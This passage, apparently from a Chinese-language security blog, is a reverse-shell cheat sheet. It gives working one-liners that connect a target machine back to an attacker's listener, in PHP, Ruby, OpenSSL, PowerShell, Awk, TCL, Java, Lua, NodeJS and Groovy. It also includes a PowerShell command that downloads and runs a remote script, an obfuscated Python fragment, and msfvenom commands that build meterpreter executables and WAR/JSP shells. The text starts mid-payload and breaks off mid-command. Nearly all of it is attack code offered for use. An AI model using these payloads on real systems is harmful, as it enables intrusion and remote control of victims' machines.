__l<span class="subst">[&#x27;p&#x27;]</span> in <span class="subst">[(s, p)]</span>]<span class="subst">[0]</span>)(&#123;&#125;), &#x27;s2p&#x27;)]]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;os&#x27;]</span> in <span class="subst">[(__import__(&#x27;os&#x27;, __g, __g))]</span>]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;socket&#x27;]</span> in <span class="subst">[(__import__(&#x27;socket&#x27;, __g, __g))]</span>]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;subprocess&#x27;]</span> in <span class="subst">[(__import__(&#x27;subprocess&#x27;, __g, __g))]</span>]<span class="subst">[0]</span> for __g<span class="subst">[&#x27;threading&#x27;]</span> in <span class="subst">[(__import__(&#x27;threading&#x27;, __g, __g))]</span>]<span class="subst">[0]</span>)((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#x27;contextlib&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="利用PHP脚本反弹shell"><a href="#利用PHP脚本反弹shell" class="headerlink" title="利用PHP脚本反弹shell"></a>利用PHP脚本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$sock</span><span class="operator">=</span>fsockopen(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>);exec(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$s</span><span class="operator">=</span>fsockopen(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>);<span class="variable">$proc</span><span class="operator">=</span>proc_open(<span class="string">&quot;/bin/sh -i&quot;</span>, array(<span class="number">0</span><span class="operator">=&gt;</span><span class="variable">$s</span>, <span class="number">1</span><span class="operator">=&gt;</span><span class="variable">$s</span>, <span class="number">2</span><span class="operator">=&gt;</span><span class="variable">$s</span>),<span class="variable">$pipes</span>);&#x27;</span><br><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$s</span><span class="operator">=</span>fsockopen(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>);shell_exec(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$s</span><span class="operator">=</span>fsockopen(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>);`<span class="operator">/</span>bin<span class="operator">/</span>sh <span class="operator">-</span>i <span class="operator">&lt;&amp;</span><span class="number">3</span> <span class="operator">&gt;&amp;</span><span class="number">3</span> <span class="number">2</span><span class="operator">&gt;&amp;</span><span class="number">3</span>`;&#x27;</span><br><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$s</span><span class="operator">=</span>fsockopen(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>);system(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$s</span><span class="operator">=</span>fsockopen(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>);popen(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>, <span class="string">&quot;r&quot;</span>);&#x27;</span><br><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$s</span><span class="operator">=</span>\&#x27;<span class="number">127.0</span>.<span class="number">0.1</span>\&#x27;;<span class="variable">$p</span><span class="operator">=</span><span class="number">443</span>;<span class="meta">@error_reporting</span>(<span class="number">0</span>);<span class="meta">@ini_set</span>(<span class="string">&quot;error_log&quot;</span>,<span class="type">NULL</span>);<span class="meta">@ini_set</span>(<span class="string">&quot;log_errors&quot;</span>,<span class="number">0</span>);<span class="meta">@set_time_limit</span>(<span class="number">0</span>);umask(<span class="number">0</span>);<span class="keyword">if</span>(<span class="variable">$s</span><span class="operator">=</span>fsockopen(<span class="variable">$s</span>,<span class="variable">$p</span>,<span class="variable">$n</span>,<span class="variable">$n</span>))&#123;<span class="keyword">if</span>(<span class="variable">$x</span><span class="operator">=</span>proc_open(\&#x27;<span class="operator">/</span>bin<span class="operator">/</span>sh<span class="variable">$IFS</span><span class="operator">-</span>i\&#x27;,array(array(\&#x27;pipe\&#x27;,\&#x27;r\&#x27;),array(\&#x27;pipe\&#x27;,\&#x27;w\&#x27;),array(\&#x27;pipe\&#x27;,\&#x27;w\&#x27;)),<span class="variable">$p</span>,getcwd()))&#123;stream_set_blocking(<span class="variable">$p</span>[<span class="number">0</span>],<span class="number">0</span>);stream_set_blocking(<span class="variable">$p</span>[<span class="number">1</span>],<span class="number">0</span>);stream_set_blocking(<span class="variable">$p</span>[<span class="number">2</span>],<span class="number">0</span>);stream_set_blocking(<span class="variable">$s</span>,<span class="number">0</span>);<span class="keyword">while</span>(<span class="literal">true</span>)&#123;<span class="keyword">if</span>(feof(<span class="variable">$s</span>))die(\&#x27;connection<span class="operator">/</span>closed\&#x27;);<span class="keyword">if</span>(feof(<span class="variable">$p</span>[<span class="number">1</span>]))die(\&#x27;shell<span class="operator">/</span>not<span class="operator">/</span>response\&#x27;);<span class="variable">$r</span><span class="operator">=</span>array(<span class="variable">$s</span>,<span class="variable">$p</span>[<span class="number">1</span>],<span class="variable">$p</span>[<span class="number">2</span>]);stream_select(<span class="variable">$r</span>,<span class="variable">$n</span>,<span class="variable">$n</span>,null);<span class="keyword">if</span>(in_array(<span class="variable">$s</span>,<span class="variable">$r</span>))fwrite(<span class="variable">$p</span>[<span class="number">0</span>],fread(<span class="variable">$s</span>,<span class="number">1024</span>));<span class="keyword">if</span>(in_array(<span class="variable">$p</span>[<span class="number">1</span>],<span class="variable">$r</span>))fwrite(<span class="variable">$s</span>,fread(<span class="variable">$p</span>[<span class="number">1</span>],<span class="number">1024</span>));<span class="keyword">if</span>(in_array(<span class="variable">$p</span>[<span class="number">2</span>],<span class="variable">$r</span>))fwrite(<span class="variable">$s</span>,fread(<span class="variable">$p</span>[<span class="number">2</span>],<span class="number">1024</span>));&#125;fclose(<span class="variable">$p</span>[<span class="number">0</span>]);fclose(<span class="variable">$p</span>[<span class="number">1</span>]);fclose(<span class="variable">$p</span>[<span class="number">2</span>]);proc_close(<span class="variable">$x</span>);&#125;<span class="keyword">else</span>&#123;die(<span class="string">&quot;proc_open/disabled&quot;</span>);&#125;&#125;<span class="keyword">else</span>&#123;die(<span class="string">&quot;not/connect&quot;</span>);&#125;&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="利用Ruby脚本反弹shell"><a href="#利用Ruby脚本反弹shell" class="headerlink" title="利用Ruby脚本反弹shell"></a>利用Ruby脚本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e&#x27;f=<span class="module-access"><span class="module"><span class="identifier">TCPSocket</span>.</span></span><span class="keyword">open</span>(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>).to_i;exec sprintf(<span class="string">&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;</span>,f,f,f)&#x27;</span><br><span class="line">ruby -rsocket -e &#x27;exit <span class="keyword">if</span> fork;c=<span class="module-access"><span class="module"><span class="identifier">TCPSocket</span>.</span></span><span class="keyword">new</span>(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="string">&quot;443&quot;</span>);<span class="keyword">while</span>(cmd=c.gets);<span class="module-access"><span class="module"><span class="identifier">IO</span>.</span></span>popen(cmd,<span class="string">&quot;r&quot;</span>)&#123;<span class="pattern-match">|io|c.print io.read&#125;<span class="keyword">end</span>&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Windows平台如下：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;c=<span class="module-access"><span class="module"><span class="identifier">TCPSocket</span>.</span></span><span class="keyword">new</span>(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="string">&quot;443&quot;</span>);<span class="keyword">while</span>(cmd=c.gets);<span class="module-access"><span class="module"><span class="identifier">IO</span>.</span></span>popen(cmd,<span class="string">&quot;r&quot;</span>)&#123;<span class="pattern-match">|io|c.print io.read&#125;<span class="keyword">end</span>&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="使用OpenSSL反弹shell"><a href="#使用OpenSSL反弹shell" class="headerlink" title="使用OpenSSL反弹shell"></a>使用OpenSSL反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">openssl</span> req -x<span class="number">509</span> -newkey rsa:<span class="number">4096</span> -keyout key.pem -out cert.pem -days <span class="number">365</span> -nodes</span><br><span class="line"><span class="attribute">openssl</span> s_server -quiet -key key.pem -cert cert.pem -port <span class="number">443</span></span><br><span class="line"><span class="attribute">ncat</span> --ssl -vv -l -p <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkfifo <span class="regexp">/tmp/</span>s; <span class="regexp">/bin/</span>sh -i &lt; <span class="regexp">/tmp/</span>s <span class="number">2</span>&gt;&amp;<span class="number">1</span> | openssl s_client -quiet -connect <span class="number">10.10</span>.<span class="number">10.11</span>:<span class="number">443</span> &gt; <span class="regexp">/tmp/</span>s; rm <span class="regexp">/tmp/</span>s</span><br></pre></td></tr></table></figure>

<h2 id="win平台下使用Powershell反弹shell"><a href="#win平台下使用Powershell反弹shell" class="headerlink" title="win平台下使用Powershell反弹shell"></a>win平台下使用Powershell反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight puppet"><table><tr><td class="code"><pre><span class="line">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(<span class="string">&quot;10.10.10.11&quot;</span>,443);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span>  = <span class="variable">$sendback</span> + <span class="string">&quot;PS &quot;</span> + (pwd).Path + <span class="string">&quot;&gt; &quot;</span>;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br><span class="line">powershell -nop -c <span class="string">&quot;<span class="variable">$client</span> = New-Object System.Net.Sockets.TCPClient(&#x27;10.10.10.11&#x27;,443);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()&quot;</span></span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(<span class="string">&#x27;https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&#x27;</span>)</span><br><span class="line">或</span><br><span class="line">[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(<span class="string">&#x27;<span class="variable">$c</span>=New-Object Net.Sockets.TCPClient(&quot;174.1.52.162&quot;,6666);<span class="variable">$s</span>=<span class="variable">$c</span>.GetStream();[byte[]]<span class="variable">$bytes</span>=0..65535|%&#123;0&#125;;while((<span class="variable">$i</span>=<span class="variable">$s</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$d</span>=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0,<span class="variable">$i</span>);<span class="variable">$sb</span>=(iex <span class="variable">$d</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sb2</span>=<span class="variable">$sb</span>+&#x27;</span><span class="string">&#x27;PS &#x27;</span><span class="string">&#x27;+(pwd).Path+&#x27;</span><span class="string">&#x27;&gt; &#x27;</span><span class="string">&#x27;;<span class="variable">$sb</span>=([Text.Encoding]::Default).GetBytes(<span class="variable">$sb2</span>);<span class="variable">$s</span>.Write(<span class="variable">$sb</span>,0,<span class="variable">$sb</span>.Length);<span class="variable">$s</span>.Flush()&#125;;<span class="variable">$c</span>.Close()&#x27;</span>))</span><br><span class="line"></span><br><span class="line">powershell -nop -<span class="keyword">enc</span> &#123;reverse <span class="literal">shell</span> <span class="literal">command</span>&#125;</span><br></pre></td></tr></table></figure>

<h2 id="利用Awk反弹shell"><a href="#利用Awk反弹shell" class="headerlink" title="利用Awk反弹shell"></a>利用Awk反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">awk &#x27;BEGIN &#123;s = <span class="string">&quot;/inet/tcp/0/10.10.10.11/443&quot;</span>; <span class="keyword">while</span>(<span class="number">42</span>) &#123; <span class="keyword">do</span>&#123; <span class="built_in">printf</span> <span class="string">&quot;shell&gt;&quot;</span> |&amp; s; s |&amp; getline c; <span class="keyword">if</span>(c)&#123; <span class="keyword">while</span> ((c |&amp; getline) &gt; <span class="number">0</span>) <span class="built_in">print</span> $<span class="number">0</span> |&amp; s; <span class="built_in">close</span>(c); &#125; &#125; <span class="keyword">while</span>(c != <span class="string">&quot;exit&quot;</span>) <span class="built_in">close</span>(s); &#125;&#125;&#x27; /dev/null</span><br></pre></td></tr></table></figure>

<h2 id="TCL脚本反弹shell"><a href="#TCL脚本反弹shell" class="headerlink" title="TCL脚本反弹shell"></a>TCL脚本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">echo &#x27;<span class="keyword">set</span> s [<span class="keyword">socket</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.11</span> <span class="number">443</span>];<span class="keyword">while</span> <span class="number">42</span> &#123; <span class="keyword">puts</span> -nonewline <span class="variable">$s</span> <span class="string">&quot;shell&gt;&quot;</span>;<span class="keyword">flush</span> <span class="variable">$s</span>;<span class="keyword">gets</span> <span class="variable">$s</span> c;<span class="keyword">set</span> e <span class="string">&quot;exec $c&quot;</span>;<span class="keyword">if</span> &#123;![<span class="keyword">catch</span> &#123;<span class="keyword">set</span> r [<span class="keyword">eval</span> <span class="variable">$e</span>]&#125; err]&#125; &#123; <span class="keyword">puts</span> <span class="variable">$s</span> <span class="variable">$r</span> &#125;; <span class="keyword">flush</span> <span class="variable">$s</span>; &#125;; <span class="keyword">close</span> <span class="variable">$s</span>;&#x27; | tclsh</span><br></pre></td></tr></table></figure>

<h2 id="Java版本反弹shell"><a href="#Java版本反弹shell" class="headerlink" title="Java版本反弹shell"></a>Java版本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<p>linux平台：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">r = Runtime<span class="selector-class">.getRuntime</span>()</span><br><span class="line"><span class="selector-tag">p</span> = r<span class="selector-class">.exec</span>(<span class="selector-attr">[<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/10.10.10.11/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>]</span> as String<span class="selector-attr">[]</span>)</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.waitFor</span>()</span><br></pre></td></tr></table></figure>

<p>windows平台：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">String</span> host=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> port=<span class="number">4444</span>;</span><br><span class="line"><span class="keyword">String</span> cmd=<span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line"><span class="built_in">Process</span> p=<span class="keyword">new</span> <span class="built_in">ProcessBuilder</span>(cmd).<span class="built_in">redirectErrorStream</span>(<span class="literal">true</span>).<span class="built_in">start</span>();Socket s=<span class="keyword">new</span> <span class="built_in">Socket</span>(host,port);InputStream pi=p.<span class="built_in">getInputStream</span>(),pe=p.<span class="built_in">getErrorStream</span>(), si=s.<span class="built_in">getInputStream</span>();OutputStream po=p.<span class="built_in">getOutputStream</span>(),so=s.<span class="built_in">getOutputStream</span>();<span class="keyword">while</span>(!s.<span class="built_in">isClosed</span>())&#123;<span class="keyword">while</span>(pi.<span class="built_in">available</span>()&gt;<span class="number">0</span>)so.<span class="built_in">write</span>(pi.<span class="built_in">read</span>());<span class="keyword">while</span>(pe.<span class="built_in">available</span>()&gt;<span class="number">0</span>)so.<span class="built_in">write</span>(pe.<span class="built_in">read</span>());<span class="keyword">while</span>(si.<span class="built_in">available</span>()&gt;<span class="number">0</span>)po.<span class="built_in">write</span>(si.<span class="built_in">read</span>());so.<span class="built_in">flush</span>();po.<span class="built_in">flush</span>();Thread.<span class="built_in">sleep</span>(<span class="number">50</span>);<span class="keyword">try</span> &#123;p.<span class="built_in">exitValue</span>();<span class="keyword">break</span>;&#125;<span class="built_in"><span class="keyword">catch</span></span> (Exception e)&#123;&#125;&#125;;p.<span class="built_in">destroy</span>();s.<span class="built_in">close</span>();</span><br></pre></td></tr></table></figure>

<p>创建线程：</p>
<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Thread</span> <span class="keyword">thread</span> = <span class="literal">new</span> <span class="keyword">Thread</span>()&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="literal">void</span> run()&#123;</span><br><span class="line">        <span class="comment">// Reverse shell here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">thread</span>.start();</span><br></pre></td></tr></table></figure>

<h2 id="生成War文件反弹shell"><a href="#生成War文件反弹shell" class="headerlink" title="生成War文件反弹shell"></a>生成War文件反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>使用如下命令生成war文件：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp <span class="attribute">LHOST</span>=10.10.10.11 <span class="attribute">LPORT</span>=443 -f war &gt; reverse.war</span><br></pre></td></tr></table></figure>

<p>查看war包中shell的jsp文件名</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">strings <span class="keyword">reverse</span>.war | <span class="keyword">grep</span> jsp</span><br></pre></td></tr></table></figure>

<p>在靶机上部署war包后，访问shell的jsp文件，即可在监听端口获得反弹shell</p>
<h2 id="使用Lua脚本反弹shell"><a href="#使用Lua脚本反弹shell" class="headerlink" title="使用Lua脚本反弹shell"></a>使用Lua脚本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令： Linux平台：</p>
<figure class="highlight csp"><table><tr><td class="code"><pre><span class="line">lua -e &quot;require(<span class="string">&#x27;socket&#x27;</span>);require(<span class="string">&#x27;os&#x27;</span>);t=socket.tcp();t:connect(<span class="string">&#x27;10.10.10.11&#x27;</span>,<span class="string">&#x27;443&#x27;</span>);os.execute(<span class="string">&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;</span>);&quot;</span><br></pre></td></tr></table></figure>

<p>Windows及Linux平台：</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">lua5<span class="number">.1</span> -e &#x27;<span class="built_in">local</span> host, port = <span class="string">&quot;10.10.10.11&quot;</span>, <span class="number">443</span> <span class="built_in">local</span> socket = require(<span class="string">&quot;socket&quot;</span>) <span class="built_in">local</span> tcp = socket.tcp() <span class="built_in">local</span> io = require(<span class="string">&quot;io&quot;</span>) tcp:connect(host, port); <span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span> <span class="built_in">local</span> cmd, <span class="built_in">status</span>, partial = tcp:receive() <span class="built_in">local</span> f = io.popen(cmd, <span class="string">&quot;r&quot;</span>) <span class="built_in">local</span> s = f:<span class="built_in">read</span>(<span class="string">&quot;*a&quot;</span>) f:<span class="built_in">close</span>() tcp:send(s) <span class="keyword">if</span> <span class="built_in">status</span> == <span class="string">&quot;closed&quot;</span> <span class="keyword">then</span> <span class="built_in">break</span> end end tcp:<span class="built_in">close</span>()&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="NodeJS版本反弹shell"><a href="#NodeJS版本反弹shell" class="headerlink" title="NodeJS版本反弹shell"></a>NodeJS版本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>),</span><br><span class="line">        cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>),</span><br><span class="line">        sh = cp.spawn(<span class="string">&quot;/bin/sh&quot;</span>, []);</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">    client.connect(<span class="number">443</span>, <span class="string">&quot;10.10.10.11&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>; </span><br><span class="line">&#125;)();</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;nc -e /bin/sh 10.10.10.11 443&#x27;</span>)</span><br><span class="line">-<span class="keyword">var</span> x = <span class="built_in">global</span>.process.mainModule.require</span><br><span class="line">-x(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;nc 10.10.10.11 443 -e /bin/bash&#x27;</span>)</span><br><span class="line"><span class="attr">https</span>:<span class="comment">//gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</span></span><br></pre></td></tr></table></figure>

<h2 id="Groovy版本反弹shell"><a href="#Groovy版本反弹shell" class="headerlink" title="Groovy版本反弹shell"></a>Groovy版本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">String</span> host=<span class="string">&quot;10.10.10.11&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> port=<span class="number">443</span>;</span><br><span class="line"><span class="keyword">String</span> cmd=<span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line"><span class="built_in">Process</span> p=<span class="keyword">new</span> <span class="built_in">ProcessBuilder</span>(cmd).<span class="built_in">redirectErrorStream</span>(<span class="literal">true</span>).<span class="built_in">start</span>();Socket s=<span class="keyword">new</span> <span class="built_in">Socket</span>(host,port);InputStream pi=p.<span class="built_in">getInputStream</span>(),pe=p.<span class="built_in">getErrorStream</span>(), si=s.<span class="built_in">getInputStream</span>();OutputStream po=p.<span class="built_in">getOutputStream</span>(),so=s.<span class="built_in">getOutputStream</span>();<span class="keyword">while</span>(!s.<span class="built_in">isClosed</span>())&#123;<span class="keyword">while</span>(pi.<span class="built_in">available</span>()&gt;<span class="number">0</span>)so.<span class="built_in">write</span>(pi.<span class="built_in">read</span>());<span class="keyword">while</span>(pe.<span class="built_in">available</span>()&gt;<span class="number">0</span>)so.<span class="built_in">write</span>(pe.<span class="built_in">read</span>());<span class="keyword">while</span>(si.<span class="built_in">available</span>()&gt;<span class="number">0</span>)po.<span class="built_in">write</span>(si.<span class="built_in">read</span>());so.<span class="built_in">flush</span>();po.<span class="built_in">flush</span>();Thread.<span class="built_in">sleep</span>(<span class="number">50</span>);<span class="keyword">try</span> &#123;p.<span class="built_in">exitValue</span>();<span class="keyword">break</span>;&#125;<span class="built_in"><span class="keyword">catch</span></span> (Exception e)&#123;&#125;&#125;;p.<span class="built_in">destroy</span>();s.<span class="built_in">close</span>();</span><br></pre></td></tr></table></figure>

<h2 id="生成Meterpreter反弹Shell"><a href="#生成Meterpreter反弹Shell" class="headerlink" title="生成Meterpreter反弹Shell:"></a>生成Meterpreter反弹Shell:</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=10.10.10.11 <span class="attribute">LPORT</span>=443 -f exe &gt; reverse.exe</span><br><span class="line">msfvenom -p windows/shell_reverse_tcp <span class="attribute">LHOST</span>=10.10.10.11 <span class="attribute">LPORT</span>=443 -f exe &gt; reverse.exe</span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=10.10.10.11 <span class="attribute">LPORT</span>=443 -f elf &gt;reverse.elf</span><br><span class="line">msfvenom -p linux/x86/shell_reverse_tcp <span class="attribute">LHOST</span>=10.10.10.11 <span class="attribute">LPORT</span>=443 -f elf &gt;reverse.elf</span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f elf &gt; shell.elf</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f exe &gt; shell.exe</span><br><span class="line">msfvenom -p osx/x86/shell_reverse_tcp <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f macho &gt; shell.macho</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f asp &gt; shell.asp</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f<span class="built_in"> raw </span>&gt; shell.jsp</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f war &gt; shell.war</span><br><span class="line">msfvenom -p cmd/unix/reverse_python <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f<span class="built_in"> raw </span>&gt; shell.py</span><br><span class="line">msfvenom 